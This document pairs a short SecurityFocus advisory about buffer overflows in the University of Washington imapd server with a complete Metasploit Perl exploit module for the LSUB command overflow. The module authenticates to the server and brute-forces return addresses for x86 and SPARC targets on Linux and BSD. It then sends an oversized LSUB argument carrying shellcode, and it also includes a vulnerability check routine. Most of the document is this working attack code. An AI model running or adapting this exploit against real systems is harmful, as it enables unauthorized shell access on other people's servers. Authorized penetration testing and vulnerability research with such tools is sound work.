source: http://www.securityfocus.com/bid/1110/info
 
A buffer overflow exists in imapd. The vulnerability exists in the list command. By supplying a long, well-crafted string as the second argument to the list command, it becomes possible to execute code on the machine.
 
Executing the list command requires an account on the machine. In addition, privileges have been dropped in imapd prior to the location of the buffer overrun. As such, this vulnerability would only be useful in a scenario where a user has an account, but no shell level access. This would allow them to gain shell access.
 
Overflows have also been found in the COPY, LSUB, RENAME and FIND command. All of these, like the LIST command, require a login on the machine. 

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::uow_imap4_lsub;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
{
	'Name'  => 'University of Washington IMAP4 LSUB Overflow',
	'Version'  => '$Revision: 1.18 $',
	'Authors' => [ 'vlad902 <vlad902 [at] gmail.com>', ],
	'Arch'  => [ 'x86', 'sparc' ],
	'OS'    => [ 'bsd', 'linux' ],
	'Priv'  => 0,
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
		'USER'  => [1, 'DATA', 'User name'],
		'PASS'  => [1, 'DATA', 'Password'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	},
	'Payload' => {
		'Space'  => 680,
		'MinNops'=> 400,
		'BadChars'  => "\x00/",
		'Keys'   => ['+findsock', '+inetd'],
	},
	'Description'  => Pex::Text::Freeform(qq{
		This exploits a buffer overflow in the LSUB command. An overly long
		argument causes a classic stack buffer overflow.
	}),
	'Refs'  =>  [  
		['BID', 1110],
		['OSVDB', 12037],
	],
	'Targets' => [ 
		[ "Linux / x86 stack bruteforce", 0, 0xbffffdfc, 0xbfa00000, 400, 1064, \&Payloadx86 ],
		[ "FreeBSD / x86 stack bruteforce", 0, 0xbfbffdfc, 0xbf100000, 400, 1064, \&Payloadx86 ],
		[ "Linux+FreeBSD+NetBSD / x86 heap bruteforce", 1, 0x0804d000, 0x081f0000, -400, 1064, \&Payloadx86 ],
# These 2 could be consolidated and you'd get 5-6 useless hits on Linux but it's better this way.
		[ "Linux / sun4m stack bruteforce", 0, 0xefffeca0, 0xefa00000, 748, 1104, \&PayloadSPARC ],
		[ "NetBSD / sun4m stack bruteforce", 0, 0xeffffca0, 0xefa00000, 748, 1104, \&PayloadSPARC ],
		[ "OpenBSD / sun4m stack bruteforce", 0, 0xf7fffca0, 0xf7a00000, 748, 1104, \&PayloadSPARC ],
	],
	'Keys'  => ['imap'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	my $curr_ret;

	$self->PrintLine(sprintf("[*] Starting bruteforce mode for target %s.", $target->[0]));

	for (
		$curr_ret  = $target->[2];
		($target->[1] == 0 && $curr_ret >= $target->[3]) || ($target->[1] == 1 && $curr_ret <= $target->[3]);
		$curr_ret -= $target->[4]
	)
	{
		if(!($curr_ret & 0xff) || ($curr_ret & 0xff) == 0x20)
		{
			$curr_ret += 4;
		}
		if(!($curr_ret & 0xff00) || ($curr_ret & 0xff00) == 0x2000)
		{
			$curr_ret -= 0x0100;
		}

		my $s = Login($self);
		if($s == -1)
		{
			return;
		}

		$self->PrintLine(sprintf("[*] Trying return address 0x%.8x...", $curr_ret));
		$s->Send(sprintf("1 LSUB \"\" {%i}\r\n", $target->[5]));
		$s->Recv(-1);
		$s->Send($target->[6]->($curr_ret, $shellcode) . "\r\n");

		$self->Handler($s);
		$s->Close();
		undef($s);
	}

	return;
}

sub Check {
	my $self = shift;

	my $s = Login($self);
	if($s == -1)
	{
		return;
	}

	$s->Send("1 LSUB \"\" {1096}\r\n");
	$s->Recv(-1);
	$s->Send(Pex::Text::AlphaNumText(1096) . "\r\n");
	my $reply = $s->Recv(-1);

	if(!$reply)
	{
		$self->PrintLine("[*] Vulnerable server.");
		return $self->CheckCode('Confirmed');
	}

	$self->PrintLine("[*] Server is probably not vulnerable.");
	return $self->CheckCode('Safe');
}



sub Login {
	my $self = shift;

	my $user = $self->GetVar('USER');
	my $pass = $self->GetVar('PASS');

	my $sock = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $self->GetVar('RHOST'), 
		'PeerPort'  => $self->GetVar('RPORT'), 
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	);
	if ($sock->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $sock->GetError);
		return -1;
	}

	$sock->Recv(-1);
	$sock->Send(sprintf("1 LOGIN \"%s\" \"%s\"\r\n", $user, $pass));
	my $reply = $sock->Recv(-1);
	if(!$reply || $reply !~ /1 OK/)
	{
		$self->PrintLine('[*] Authentication failed.');
		return -1;
	}
	undef($reply);

	return $sock;
}

sub Payloadx86 {
	my $ret = shift;
	my $sc = shift;

	my $buf;

# XXX: More precise.
	$buf = $sc . pack("V", $ret) x 96;

	return $buf;
}

sub PayloadSPARC {
	my $ret = shift;
	my $sc = shift; 

	my $buf;

	$buf = substr($sc, 0, 1032 - 680) . $sc . pack("N", $ret - 32) x 15 . pack("N", $ret) x 3;

	return $buf;
}